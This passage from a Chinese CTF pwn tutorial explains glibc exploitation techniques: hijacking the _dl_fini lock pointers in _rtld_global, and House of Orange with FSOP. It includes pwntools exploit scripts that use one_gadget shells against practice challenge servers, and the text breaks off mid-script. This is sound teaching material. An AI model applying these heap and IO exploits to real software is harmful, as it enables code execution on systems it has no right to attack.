+    <span class="p">(((</span><span class="n">_IO_strfile</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">_s</span><span class="p">.</span><span class="n">_free_buffer</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>     <span class="c1">// 在这个相对地址放上 system 的地址</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  <span class="n">_IO_wdefault_finish</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="_dl_fini">修改 _dl_fini 函数指针<a class="headerlink" href="#_dl_fini" title="Permanent link">&para;</a></h3>
+<p>以 hctf2018_the_end 为例子，题目部署在 Ubuntu 18，远程实验到 buu 。</p>
+<blockquote>
+<p>这条题目在 Ubuntu 18 下有 vtable 检查，修改 vtable 方法失效。</p>
+<p>下面调试过程中寻找 libc 与 ld 偏移时与 buu 靶机情况不一样，因为我们本地在 docker 改 libc 运行 ld 和 libc 位置变化了，具体看后文</p>
+</blockquote>
+<p>exit() 函数的利用链：</p>
+<p><img alt="exit()" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212231817.png" /></p>
+<p>在 exit 函数中会调用 <code>__run_exit_handlers()</code> ：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">//glibc/stdlib/exit.c</span>
+<span class="err">……</span>
+<span class="kt">void</span>
+<span class="n">exit</span> <span class="p">(</span><span class="kt">int</span> <span class="n">status</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">__run_exit_handlers</span> <span class="p">(</span><span class="n">status</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__exit_funcs</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="err">……</span>
+</code></pre></div>
+<p>__run_exit_handlers() 调用 _dl_fini ：</p>
+<p><img alt="image-20201212231929231" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212231929.png" /></p>
+<p>在 _dl_fini 函数中调用调用函数 <code>__rtld_lock_lock_recursive()</code> 和 <code>__rtld_lock_unlock_recursive()</code>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">//glibc/elf/dl-fini.c</span>
+<span class="p">...</span>
+<span class="cp">#endif</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">Lmid_t</span> <span class="n">ns</span> <span class="o">=</span> <span class="n">GL</span><span class="p">(</span><span class="n">dl_nns</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">ns</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="n">ns</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="cm">/* Protect against concurrent loads and unloads.  */</span>
+      <span class="n">__rtld_lock_lock_recursive</span> <span class="p">(</span><span class="n">GL</span><span class="p">(</span><span class="n">dl_load_lock</span><span class="p">));</span>
+      <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">nloaded</span> <span class="o">=</span> <span class="n">GL</span><span class="p">(</span><span class="n">dl_ns</span><span class="p">)[</span><span class="n">ns</span><span class="p">].</span><span class="n">_ns_nloaded</span><span class="p">;</span>
+      <span class="cm">/* No need to do anything for empty namespaces or those used for</span>
+<span class="cm">         auditing DSOs.  */</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">nloaded</span> <span class="o">==</span> <span class="mi">0</span>
+<span class="cp">#ifdef SHARED</span>
+          <span class="o">||</span> <span class="n">GL</span><span class="p">(</span><span class="n">dl_ns</span><span class="p">)[</span><span class="n">ns</span><span class="p">].</span><span class="n">_ns_loaded</span><span class="o">-&gt;</span><span class="n">l_auditing</span> <span class="o">!=</span> <span class="n">do_audit</span>
+<span class="cp">#endif</span>
+          <span class="p">)</span>
+        <span class="n">__rtld_lock_unlock_recursive</span> <span class="p">(</span><span class="n">GL</span><span class="p">(</span><span class="n">dl_load_lock</span><span class="p">));</span>
+      <span class="k">else</span>
+        <span class="p">{</span>
+<span class="p">...</span>
+</code></pre></div>
+<p><code>__rtld_lock_lock_recursive</code>、<code>__rtld_lock_unlock_recursive</code>是通过宏定义来的：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">//glibc/sysdeps/nptl/libc-lockP.h</span>
+<span class="cp"># define __rtld_lock_lock_recursive(NAME) \</span>
+<span class="cp">  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span>
+<span class="cp"># define __rtld_lock_unlock_recursive(NAME) \</span>
+<span class="cp">  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span>
+</code></pre></div>
+<p>从上面定义知道真正函数是 GL 宏中的 <code>dl_rtld_lock_recursive</code> ，查看宏 GL 定义：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">//Rtld.c</span>
+<span class="k">extern</span> <span class="k">struct</span> <span class="nc">rtld_global</span> <span class="n">_rtld_local</span>
+    <span class="n">__attribute__</span> <span class="p">((</span><span class="n">alias</span> <span class="p">(</span><span class="s">&quot;_rtld_global&quot;</span><span class="p">),</span> <span class="n">visibility</span> <span class="p">(</span><span class="s">&quot;hidden&quot;</span><span class="p">)));</span>
+
+<span class="c1">//Ldsodefs.h</span>
+<span class="k">extern</span> <span class="k">struct</span> <span class="nc">rtld_global</span> <span class="n">_rtld_local</span> <span class="n">__rtld_local_attribute__</span><span class="p">;</span>
+<span class="cp">#  undef __rtld_local_attribute__</span>
+<span class="cp"># endif</span>
+<span class="k">extern</span> <span class="k">struct</span> <span class="nc">rtld_global</span> <span class="n">_rtld_global</span> <span class="n">__rtld_global_attribute__</span><span class="p">;</span>
+<span class="cp"># undef __rtld_global_attribute__</span>
+
+<span class="c1">//Db_info.c</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">rtld_global</span> <span class="n">rtld_global</span><span class="p">;</span>
+
+<span class="c1">//elf/Rtld.c</span>
+<span class="k">struct</span> <span class="nc">rtld_global</span> <span class="n">_rtld_global</span> <span class="o">=</span>
+  <span class="p">{</span>
+    <span class="cm">/* Generally the default presumption without further information is an</span>
+<span class="cm">     * executable stack but this is not true for all platforms.  */</span>
+    <span class="p">.</span><span class="n">_dl_stack_flags</span> <span class="o">=</span> <span class="n">DEFAULT_STACK_PERMS</span><span class="p">,</span>
+<span class="cp">#ifdef _LIBC_REENTRANT</span>
+    <span class="p">.</span><span class="n">_dl_load_lock</span> <span class="o">=</span> <span class="n">_RTLD_LOCK_RECURSIVE_INITIALIZER</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">_dl_load_write_lock</span> <span class="o">=</span> <span class="n">_RTLD_LOCK_RECURSIVE_INITIALIZER</span><span class="p">,</span>
+<span class="cp">#endif</span>
+    <span class="p">.</span><span class="n">_dl_nns</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">_dl_ns</span> <span class="o">=</span>
+    <span class="p">{</span>
+<span class="cp">#ifdef _LIBC_REENTRANT</span>
+      <span class="p">[</span><span class="n">LM_ID_BASE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">_ns_unique_sym_table</span>
+               <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">lock</span> <span class="o">=</span> <span class="n">_RTLD_LOCK_RECURSIVE_INITIALIZER</span> <span class="p">}</span> <span class="p">}</span>
+<span class="cp">#endif</span>
+    <span class="p">}</span>
+  <span class="p">};</span>
+
+<span class="c1">//Ldsodefs.h</span>
+<span class="cp">#ifndef SHARED</span>
+<span class="cp"># define EXTERN extern</span>
+<span class="cp"># define GL(name) _##name</span>
+<span class="cp">#else</span>
+<span class="cp"># define EXTERN</span>
+<span class="cp"># if IS_IN (rtld)</span>
+<span class="cp">#  define GL(name) _rtld_local._##name</span>
+<span class="cp"># else</span>
+<span class="cp">#  define GL(name) _rtld_global._##name</span>
+<span class="cp"># endif</span>
+</code></pre></div>
+<p>有点复杂，这里简化描述一下：从 40-45 知道 GL 是 _rtld_local 或 _rtld_global 类型的结构体；两种结构体定义看上面代码前面部分。所以 GL(dl_rtld_lock_recursive) 是 _rtld_global 结构体内的 dl_rtld_lock_recursive 指针。</p>
+<p>有点绕，先整理下 _dl_fini 调用的实际是什么：</p>
+<div class="highlight"><pre><span></span><code>_dl_fini 调用 __rtld_lock_lock_recursive
+__rtld_lock_lock_recursive 宏定义为 GL(dl_rtld_lock_recursive)
+GL 是一个 _rtld_global 结构体
+dl_rtld_lock_recursive 是 _rtld_global 结构体的一个指针
+</code></pre></div>
+<p><strong>_dl_fini 实际调用 _rtld_global 结构体的 _dl_rtld_lock_recursive 指针。</strong></p>
+<p>在 gdb 中查看 _rtld_global 信息：</p>
+<div class="highlight"><pre><span></span><code>p _rtld_global#查看结构体内容
+p *_rtld_global#查看结构体地址
+</code></pre></div>
+<p>在结构体里面找到了实际的调用的函数指针：</p>
+<p><img alt="image-20201212010538691" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212010538.png" /></p>
+<p>**_rtld_global 是在 ld.so 内存段**里面的，泄露 libc 可以通过偏移计算出 ld 基地址，按照图中偏移应该为 <code>offset=0x7f30c73af000-0x7f30c6df8000=0x5b7000</code>：</p>
+<p><img alt="image-20201212010329020" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212010329.png" /></p>
+<p>由于我这里调试时改 libc 和 ld 所以计算出来的偏移 0x5b7000 并不是远程环境（原生18.04运行）下的偏移，在 Ubuntu 18.04 下重新调试计算得出偏移为 <code>0x3f1000</code> ，这个偏移与 buu 上的环境一样：</p>
+<p><img alt="image-20201212164833238" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212164833.png" /></p>
+<p>计算出 _rtld_global 的地址通过偏移得到 _dl_rtld_lock_recursive 、_dl_rtld_unlock_recursive 地址。这个偏移我是 gdb 查看 _rtld_global 地址，不断加偏移找：</p>
+<div class="highlight"><pre><span></span><code><span class="n">_dl_rtld_lock_lock_recursive</span> <span class="o">-&gt;</span> <span class="mh">0xf00</span>
+<span class="n">_dl_rtld_lock_unlock_recursive</span> <span class="o">-&gt;</span> <span class="mh">0xf08</span>
+</code></pre></div>
+<p><img alt="image-20201212165906952" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212165907.png" /></p>
+<p>两个函数都会调用，将其指针改成 onegadget ，最后尝试 _dl_rtld_unlock_recursive 才满足 onegadget 条件。</p>
+<p><strong>EXP</strong> 如下：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">#remote:ubuntu18.04</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span>
+    <span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span><span class="s1">&#39;sp&#39;</span><span class="p">,</span><span class="s1">&#39;-h&#39;</span><span class="p">])</span>
+
+<span class="c1">#p = process([&quot;/glibc/2.27/64/lib/ld-2.27.so&quot;, &quot;./the_end&quot;], env={&quot;LD_PRELOAD&quot;:&quot;/glibc/2.27/64/lib/libc-2.27.so&quot;})</span>
+<span class="c1">#libc = ELF(&quot;/glibc/2.27/64/lib/libc-2.27.so&quot;)</span>
+<span class="c1">#ld = ELF(&quot;/glibc/2.27/64/lib/ld-2.27.so&quot;)</span>
+<span class="c1"># p = process(&quot;./the_end&quot;)</span>
+<span class="c1"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span>
+<span class="c1"># ld = ELF(&quot;/lib/x86_64-linux-gnu/ld-2.27.so&quot;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;node3.buuoj.cn&quot;</span><span class="p">,</span><span class="mi">27518</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc-2.27.so&quot;</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/ld-2.27.so&quot;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./the_end&quot;</span><span class="p">)</span>
+
+<span class="n">offset_ldbase_of_libcbase</span> <span class="o">=</span> <span class="mh">0x3f1000</span><span class="c1">#0x5b7000</span>
+<span class="n">offset_dl_rtld_lock_recursive_of_rtld_global</span> <span class="o">=</span> <span class="mh">0xf00</span>
+<span class="n">offset_dl_rtld_unlock_recursive_of_rtld_global</span> <span class="o">=</span> <span class="mh">0xf08</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;gift &quot;</span><span class="p">)</span>
+<span class="n">sleep_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;sleep_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">sleep_addr</span><span class="p">))</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">sleep_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;sleep&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc_base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">ld_base</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">offset_ldbase_of_libcbase</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;ld_base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ld_base</span><span class="p">))</span>
+<span class="n">rtld_global</span> <span class="o">=</span> <span class="n">ld_base</span><span class="o">+</span><span class="n">ld</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_rtld_global&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;rtld_global:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">rtld_global</span><span class="p">))</span>
+<span class="n">dl_rtld_lock_recursive</span> <span class="o">=</span> <span class="n">rtld_global</span><span class="o">+</span><span class="n">offset_dl_rtld_lock_recursive_of_rtld_global</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;dl_rtld_lock_recursive:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">dl_rtld_lock_recursive</span><span class="p">))</span>
+<span class="n">dl_rtld_unlock_recursive</span> <span class="o">=</span> <span class="n">rtld_global</span><span class="o">+</span><span class="n">offset_dl_rtld_unlock_recursive_of_rtld_global</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;dl_rtld_unlock_recursive_of_rtld_global:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">dl_rtld_unlock_recursive</span><span class="p">))</span>
+
+<span class="n">onegadget</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4f322</span>
+
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span>
+<span class="sd">constraints:</span>
+<span class="sd">  rsp &amp; 0xf == 0</span>
+<span class="sd">  rcx == NULL</span>
+
+<span class="sd">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span>
+<span class="sd">constraints:</span>
+<span class="sd">  [rsp+0x40] == NULL</span>
+
+<span class="sd">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span>
+<span class="sd">constraints:</span>
+<span class="sd">  [rsp+0x70] == NULL</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+<span class="c1">#gdb.attach(p,&quot;b *$rebase(0x964)&quot;)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="c1">#p.send(p64(dl_rtld_lock_recursive+i))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">dl_rtld_unlock_recursive</span><span class="o">+</span><span class="n">i</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)[</span><span class="n">i</span><span class="p">])</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;exec 1&gt;&amp;0&quot;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="house-of-orange">House of orange<a class="headerlink" href="#house-of-orange" title="Permanent link">&para;</a></h2>
+<h3 id="_16">概述<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
+<p>house of orange 特殊之处是题目没有 free 函数等释放堆块函数。house of orange 核心思想通过漏洞实现 free 的效果。</p>
+<h3 id="_17">使用条件<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
+<ul>
+<li>能控制 topchunk size 位（堆溢出等）</li>
+<li>能控制堆分配的大小</li>
+</ul>
+<h3 id="_18">原理<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<p>当 topchunk 不能满足申请分配的大小时，topchunk 被释放进 unsortedbin ，实现没有 free 函数释放堆块。</p>
+<p>扩展堆空间有 <code>mmap</code> 和 <code>brk</code> 两种方式，我们需要以 <code>brk</code> 拓展，需要绕过 libc 一些 check ：<strong>malloc 申请大小不能大于 <code>mmp_.mmap_threshold</code></strong></p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">mp_</span><span class="p">.</span><span class="n">mmap_threshold</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">mp_</span><span class="p">.</span><span class="n">n_mmaps</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">n_mmaps_max</span><span class="p">))</span>
+</code></pre></div>
+<p>总结伪造 topchunk 要求：</p>
+<ul>
+<li>伪造 size 需要对齐内存页</li>
+</ul>
+<p>比如现在 topchunk size 为：<code>0x20fa1</code>，那么对齐内存页的 size 可以为：0xfa1、0x1fa1……</p>
+<ul>
+<li>
+<p>size 要大于 MINSIZE</p>
+</li>
+<li>
+<p>prev_inuse 为 1</p>
+</li>
+<li>
+<p>size 要小于等等申请 chunk_size+MINISIZE （才能让 topchunk 放入 unsortedbin）</p>
+</li>
+</ul>
+<p>自此得到一个 unsortedbin 堆，用来泄露 libc 地址，实现 FSOP</p>
+<h3 id="hitcon_2016_houseoforange">hitcon_2016_houseoforange<a class="headerlink" href="#hitcon_2016_houseoforange" title="Permanent link">&para;</a></h3>
+<h4 id="_19">基本情况<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h4>
+<p>保护全开，实验环境在 Ubuntu16.04。</p>
+<p>能自主控制分配堆大小，结构体如下：</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span><span class="p">{</span>
+  <span class="o">*</span><span class="n">info</span><span class="p">;</span>
+  <span class="n">chunk_ptr</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">struct</span> <span class="nc">info</span><span class="p">{</span>
+  <span class="n">price</span><span class="p">;</span>
+  <span class="n">color</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>在 edit 函数中存在堆溢出：</p>
+<p><img alt="image-20201216230021762" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216230021.png" /></p>
+<h4 id="_20">思路<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h4>
+<p>利用堆溢出将 topchunk size 改小，size 要求看前文。修改前 topchunk 和 heap 范围：</p>
+<p><img alt="image-20201216231726321" src="../../../../../Library/Application Support/typora-user-images/image-20201216231726321.png" /></p>
+<p>修改后情况：</p>
+<p><img alt="image-20201216231929179" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216231929.png" /></p>
+<p>之后申请一个大于 topchunk 的堆，topchunk 就被放入 unsortedbin ：</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; bin
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x5555557580a0 —▸ 0x7ffff7dd1b78 <span class="o">(</span>main_arena+88<span class="o">)</span> ◂— 0x5555557580a0
+</code></pre></div>
+<p>申请一个 largebin 用于泄露 libc 和 堆地址。用的 malloc 分配，libc 读取 bk 位置信息即可，分配的是 largebin 在 fd_nextsize 和 bk_nextsize 都存放堆地址分别读出即可。堆地址在 FSOP 伪造 vtable 需要用到。</p>
+<p>自此后面就是 FSOP 利用。劫持在 libc 中的 _IO_list_all 内容，将其内容指向可控地址伪造 _IO_FILE_plus 和 vtabel 。默认状态下的 _IO_list_all 指向的是 _IO_2_1_stderr_ ：</p>
+<p><img alt="image-20201216232610931" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216232611.png" /></p>
+<p>利用堆溢出修改在 unsortedbin 的 topchunk fd bk 指针，发起 unsortedbin attack 劫持 _IO_list_all 。这里修改完 fd bk 之后申请一个堆，topchunk unlink 就会修改 _IO_list_all 指向到 main_arena+88 ，这个区域前后我们还是不能控制，就利用 _chain 标志位指向下一个文件流，这个标志位的位置刚好是 unsortedbin 0x60 链表位置。因此将 topchunk size 覆盖为 0x60 ：</p>
+<p><img alt="image-20201216234838174" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216234838.png" /></p>
+<p>执行 _IO_flush_all_lockp 时逐个遍历文件流，遇到错误文件就跳过去处理 _chain 指向的下一个文件流，因此现在 topchunk 里面伪造一个 _IO_FILE_plus 结构体。</p>
+<p>需要设置几个标志位绕过保护：</p>
+<p><div class="highlight"><pre><span></span><code><span class="n">mode_offset</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span>
+<span class="n">writeptr_offset</span><span class="o">=</span><span class="mh">0x1</span><span class="p">;</span>
+<span class="n">writebase_offset</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span>
+</code></pre></div>
+然后将 vtable 指针劫持会 topchunk 特定位置，让 __overflow 为 system ，文件流（topchunk）头部覆盖为 /bin/sh 作为参数传入。</p>
+<p>成功结构体如下：</p>
+<p><img alt="image-20201217000607071" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000607.png" /></p>
+<p><img alt="image-20201217000644542" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000644.png" /></p>
+<h4 id="exp_1">EXP<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+
+<span class="c1"># p = process(&quot;./houseoforange_hitcon_2016&quot;)</span>
+<span class="c1"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;node3.buuoj.cn&quot;</span><span class="p">,</span><span class="mi">29595</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc-2.23.so&quot;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./houseoforange_hitcon_2016&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">command</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">price</span><span class="p">,</span> <span class="n">color</span><span class="p">):</span>
+    <span class="n">command</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Length of name :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Name :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Price of Orange:&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Color of Orange:&quot;</span><span class="p">)</span> 
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+    <span class="n">command</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">price</span><span class="p">,</span> <span class="n">color</span><span class="p">):</span>
+    <span class="n">command</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Length of name :&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Name:&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Price of Orange:&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Color of Orange:&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">))</span>
+
+<span class="c1"># step1 &#39;free&#39; 2 bin</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfa1</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="n">payload</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">,</span><span class="mh">0xddaa</span><span class="p">)</span>
